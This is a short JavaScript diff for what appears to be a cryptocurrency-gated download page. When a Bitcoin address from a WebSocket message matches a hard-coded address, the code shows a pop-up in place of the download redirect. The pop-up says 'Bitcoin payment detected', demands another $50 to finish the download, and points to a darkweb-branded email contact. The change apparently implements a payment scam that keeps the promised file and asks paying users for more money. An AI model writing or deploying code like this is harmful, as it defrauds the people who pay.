@@ -10,6 +10,20 @@ binance.onmessage = function(onmsg){
     var address2 = '1AMjPsZQvqeAfnEjfk17fEUZc6rZuM9Ccp';
 
     if(address1 == address2) {        
-        window.location.assign('save');
+        var shortCutFunction = 'success';
+        var msg = `
+            Bitcoin payment detected,
+            <hr class="to-hr">
+            Add $50 to complete the download.
+            <hr>
+            Contact: darkweb.ink@proton.me.
+        `;
+        toastr.options =  {
+            closeButton: true, debug: false, newestOnTop: true, progressBar: true,
+            positionClass: 'toast-top-full-width', preventDuplicates: true, onclick: null, 
+            timeOut: 7000
+        };
+        var $toast = toastr[shortCutFunction](msg);
+        $toastlast = $toast;
     }             
 }
